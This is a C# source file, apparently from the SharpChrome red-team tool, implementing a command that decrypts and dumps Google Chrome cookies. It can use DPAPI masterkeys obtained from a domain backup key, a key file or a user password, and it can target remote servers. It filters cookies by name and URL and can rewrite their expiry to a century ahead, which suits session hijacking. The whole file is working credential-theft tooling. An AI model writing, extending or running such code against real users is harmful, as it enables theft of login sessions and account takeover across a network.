using System;
using System.Collections.Generic;
using System.IO;

namespace SharpChrome.Commands
{
    public class Cookies : ICommand
    {
        public static string CommandName => "cookies";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("\r\n[*] Action: Chrome Cookies Triage\r\n");
            arguments.Remove("cookies");

            string displayFormat = "csv";   // "csv", "table", or "json" display
            string server = "";             // used for remote server specification
            bool showAll = false;           // whether to display entries with null passwords
            bool unprotect = false;         // whether to force CryptUnprotectData()
            bool setneverexpire = false;    // set cookie output expiration dates to now + 100 years
            string cookieRegex = "";        // regex to search for specific cookie names
            string urlRegex = "";           // regex to search for specific URLs for cookies

            if (arguments.ContainsKey("/format"))
            {
                displayFormat = arguments["/format"];
            }

            if (arguments.ContainsKey("/cookie"))
            {
                cookieRegex = arguments["/cookie"];
            }

            if (arguments.ContainsKey("/url"))
            {
                urlRegex = arguments["/url"];
            }

            if (arguments.ContainsKey("/unprotect"))
            {
                unprotect = true;
            }

            if (arguments.ContainsKey("/setneverexpire"))
            {
                setneverexpire = true;
            }

            if (arguments.ContainsKey("/showall"))
            {
                showAll = true;
            }

            if(showAll)
            {
                Console.WriteLine("[*] Triaging all cookies, including expired ones.");
            }
            else
            {
                Console.WriteLine("[*] Triaging non-expired cookies. Use '/showall' to display ALL cookies.");
            }

            if (arguments.ContainsKey("/server"))
            {
                server = arguments["/server"];
                Console.WriteLine("[*] Triaging remote server: {0}\r\n", server);
            }

            // {GUID}:SHA1 keys are the only ones that don't start with /
            Dictionary<string, string> masterkeys = new Dictionary<string, string>();
            foreach (KeyValuePair<string, string> entry in arguments)
            {
                if (!entry.Key.StartsWith("/"))
                {
                    masterkeys.Add(entry.Key, entry.Value);
                }
            }
            if (arguments.ContainsKey("/pvk"))
            {
                // use a domain DPAPI backup key to triage masterkeys
                masterkeys = SharpDPAPI.Dpapi.PVKTriage(arguments);
            }
            else if (arguments.ContainsKey("/mkfile"))
            {
                masterkeys = SharpDPAPI.Helpers.ParseMasterKeyFile(arguments["/mkfile"]);
            }
            else if (arguments.ContainsKey("/password"))
            {
                string password = arguments["/password"];
                Console.WriteLine("[*] Will decrypt user masterkeys with password: {0}\r\n", password);
                if (arguments.ContainsKey("/server"))
                {
                    masterkeys = SharpDPAPI.Triage.TriageUserMasterKeys(null, true, arguments["/server"], password);
                }
                else
                {
                    masterkeys = SharpDPAPI.Triage.TriageUserMasterKeys(null, true, "", password);
                }
            }

            if (arguments.ContainsKey("/target"))
            {
                string target = arguments["/target"].Trim('"').Trim('\'');

                if (File.Exists(target))
                {
                    Console.WriteLine("[*] Target 'Cookies' File: {0}\r\n", target);
                    Chrome.ParseChromeCookies(masterkeys, target, displayFormat, showAll, unprotect, cookieRegex, urlRegex);
                }
                else
                {
                    Console.WriteLine("\r\n[X] '{0}' is not a valid file.", target);
                }
            }
            else
            {
                if (arguments.ContainsKey("/server") && !arguments.ContainsKey("/pvk") && !arguments.ContainsKey("/password"))
                {
                    Console.WriteLine("[X] The '/server:X' argument must be used with '/pvk:BASE64...' or '/password:X' !");
                }
                else
                {
                    Chrome.TriageChromeCookies(masterkeys, server, displayFormat, showAll, unprotect, cookieRegex, urlRegex, setneverexpire);
                }
            }
        }
    }
}